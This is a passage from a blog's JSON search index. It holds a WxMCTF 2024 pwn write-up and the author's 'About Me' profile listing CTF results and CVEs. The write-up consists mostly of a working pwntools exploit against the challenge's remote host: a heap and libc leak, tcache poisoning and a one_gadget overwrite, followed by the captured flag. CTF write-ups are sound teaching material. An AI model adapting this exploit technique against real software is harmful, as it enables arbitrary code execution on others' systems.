2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Exploit from pwn import * #p = process(\"./lain\") p = remote(\"50790b2.678470.xyz\", 31454) e = ELF(\"./lain\") context.terminal = ['tmux', 'splitw', '-h'] context.log_level = 'debug' def leak(addr): p.sendlineafter(b\"\u003c\u003c\u003c\", \"(+ \\\"\\\" \" + str(addr) + \")\") a = \"a\" * 0x98 p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ 0 \\\"a\\\")\") res = int(p.recvline().strip(), 10) print(hex(res)) p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ \\\"{a}\\\" \\\"{a}\\\")\") p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ \\\"{a}\\\" \\\"{a}\\\")\") p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ \\\"\\\" \\\"aaaaaaaa\\\")\") key = res \u003e\u003e 12 print(key) off = res + 0x698 leak(off) p.recvn(1) libc_base = u64(p.recvn(6).ljust(8, b\"\\x00\")) - 0x21ace0 og = libc_base + 0xebd38 print(hex(og)) # gdb.attach(p) p.sendlineafter(b\"\u003c\u003c\u003c\", b\"(+ \" + p64(0) *2 + b\" \" + p64(0x411) *4 + p64((libc_base+0x21a000) ^ key) + b\")\") b = b\"a\" * 0x98 + p64(og)[:6] p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ \\\"\".encode() + b + f\"\\\" \\\"\".encode() + b + f\"\\\" \\\"{a}\\\" \\\"{a}\\\" \\\"{a}\\\" \\\"{a}\\\" \\\"{a}\\\")\".encode()) p.interactive() To exploit the binary, I leaked the heap address and then leaked the address of libc remaining in the heap. After that, I was able to exploit the binary by using the overflow vulnerability to manipulate the tcache of size 0xa0 and overwrite libc got with one_gadget. flag wxmctf{(did (you (know (?))))(lisp (is (the (most (powerful (language))))))!!} author writup link ","date":"2024-04-07","objectID":"/wxmctf_2024/:5:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":null,"content":"Intro Sungmin Kim (a.k.a kimg00n) Raon Secure Core Research Team Konyang Univ, Cyber Security undergraduate Interested in Pwnable In SaturnX Team(CTF Player) Skills System Hacking, Reversing C Node.js Docker Solidity etc… Experiences 2019.12 ~ 2021.7 Republic of Korea Air Force Information Security Soldier 2021.7 ~ 2021.12 Big data analysis and security expert training in Pyeongtaek city ELK Logging Project 2022.3 ~ 2022.9 Konyang University 5th K-CTF PL Guidance on problem solving in making challenges 2022.7 ~ 2023.3 KITRI Best of the Best(BoB) 11th vulnerability analysis Track 2022.8 ~ 2022.12 UEFI Exploitation Fuzzer project in BoB MCD Team Our Project Gitbook UEFI Security Paper CISC-W'22 Poster session accepted CVE-2023-27471(SA-2023036) SVE-2023-0437(CVE-2023-30738) 2023.3 ~ 2023.12 Chairman of Impes, a cyber security club at Konyang University 2024.2 ~ now Core Research Team in Raon Secure 🚩CTFs 2023.03 Wolv CTF 2023 6th place in SaturnX 2023.05 DEFCON31 Qual 17th place in untitled 2023.08 ESCAPE CTF 2023 Pre 6th place in 한입보이 2023.08 Samsung Security Tech Forum CTF 6th place in SaturnX 2024.02 ESCAPE CTF 2023 Final 4th place in SaturnX 2024.03 WxMCTF 2024 2nd place in Megaricano 2024.03 VolgaCTF 2024 Qualifier 6th place in SaturnX 2024.08 CCE 2024 Qualifier Gov division Finalist in KRAF 2024.09 CCE 2024 Final Gov division 6th place in KRAF 2024.09 Defcamp CTF 2024 Qualifier Finalist in SaturnX etc… 🏆 Awards 2020.11 Konyang University 3rd K-CTF 2nd Prize 2023.09 Cyber Security Conference at HONAM 웹 취약점 경진대회 3rd Prize ","date":"2024-04-07","objectID":"/about/:0:0","tags":null,"title":"About Me","uri":"/about/"}]